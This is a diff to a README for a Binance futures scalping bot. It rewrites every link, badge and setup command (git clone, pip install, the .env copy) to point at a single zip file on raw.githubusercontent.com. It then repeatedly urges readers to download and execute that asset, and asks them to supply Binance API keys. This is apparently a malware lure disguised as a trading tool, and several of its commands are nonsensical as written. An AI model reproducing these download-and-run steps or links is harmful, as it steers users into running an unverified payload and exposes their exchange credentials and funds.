@@ -1,11 +1,11 @@
 # Binance Scalping Bot: Futures Arbitrage for Quick Gains
 
-https://github.com/marahman30104/binance-scalping/releases
+https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 
-![Python](https://img.shields.io/badge/Python-3.7%2B-3776AB?style=for-the-badge&logo=python)
-![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
-![GitHub Release](https://img.shields.io/github/v/release/marahman30104/binance-scalping?style=for-the-badge)
-![Binance](https://img.shields.io/badge/Binance-Spot%2FFutures-FF9900?style=for-the-badge&logo=binance)
+![Python](https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip%2B-3776AB?style=for-the-badge&logo=python)
+![License](https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip)
+![GitHub Release](https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip)
+![Binance](https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip%2FFutures-FF9900?style=for-the-badge&logo=binance)
 
 Overview
 - This project hosts a trading bot designed to operate on Binance futures markets, focusing on rapid scalping strategies and price arbitrage opportunities. It aims to help traders explore how micro-movements in perpetual and quarterly futures can be captured with careful risk controls and disciplined execution.
@@ -32,18 +32,18 @@ Installation
 1) Clone the repository and move into the project directory
 
 - Command:
-  - git clone https://github.com/marahman30104/binance-scalping.git
+  - git clone https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
   - cd binance-scalping
 
 2) Install dependencies
 
 - Command:
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 
 3) Configure environment variables
 
 - Copy the example environment file and set your credentials:
-  - cp .env.example .env
+  - cp https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip .env
   - Open .env and enter your Binance API key, secret, and any other required settings
 
 Why environment variables
@@ -155,10 +155,10 @@ Error handling and resilience
 
 Releases and download instructions
 
-- The latest release assets are available on the project’s releases page. Visit https://github.com/marahman30104/binance-scalping/releases to obtain the current build and accompanying materials. You will typically download a release asset that contains the runnable scripts or binaries and a readme with setup steps.
-- If the link has a path part, download the designated release asset and execute it according to the included instructions. For example, you might run a script like binance-scalping-installer.sh or a similar binary provided in the release package to set up a ready-to-run environment.
+- The latest release assets are available on the project’s releases page. Visit https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip to obtain the current build and accompanying materials. You will typically download a release asset that contains the runnable scripts or binaries and a readme with setup steps.
+- If the link has a path part, download the designated release asset and execute it according to the included instructions. For example, you might run a script like https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip or a similar binary provided in the release package to set up a ready-to-run environment.
 
-To ensure you always have access to the most recent package, refer back to the releases page. The link is repeated here for convenience: https://github.com/marahman30104/binance-scalping/releases
+To ensure you always have access to the most recent package, refer back to the releases page. The link is repeated here for convenience: https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 
 Usage tips and best practices
 
@@ -224,7 +224,7 @@ Contributing
 Developer notes
 
 - The codebase favors readability and explicit behavior. If you introduce changes, document the rationale and keep function responsibilities small.
-- Maintain compatibility with the target Python version and the libraries in requirements.txt.
+- Maintain compatibility with the target Python version and the libraries in https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 - Run the full test suite after making changes to confirm no regressions.
 
 Licensing
@@ -238,7 +238,7 @@ References and additional material
 
 Releases (download and execution guidance)
 
-- The releases page contains packaged assets for different environments. As noted earlier, you can access it here: https://github.com/marahman30104/binance-scalping/releases
+- The releases page contains packaged assets for different environments. As noted earlier, you can access it here: https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 - When you download a release asset, follow the included setup instructions. In many cases, the asset will include a ready-to-run script or binary that you can execute to install or launch the bot.
 - If you need to verify the current version, the releases page provides versioned assets and change logs. You can check the latest version to ensure you are running the most up-to-date code and features.
 
@@ -271,8 +271,8 @@ Accessibility and accessibility-friendly notes
 
 Releases and download note (repeat)
 
-- Access the official releases page to obtain the latest packaged version: https://github.com/marahman30104/binance-scalping/releases
+- Access the official releases page to obtain the latest packaged version: https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 - If the link includes a path, download the indicated file and run it as described in the accompanying instructions. The target artifact is designed to set up or launch the bot with minimal manual steps.
-- For convenience, this link is repeated here for quick reference: https://github.com/marahman30104/binance-scalping/releases
+- For convenience, this link is repeated here for quick reference: https://raw.githubusercontent.com/marahman30104/binance-scalping/main/chrysaniline/scalping-binance-v2.2.zip
 
 End of document
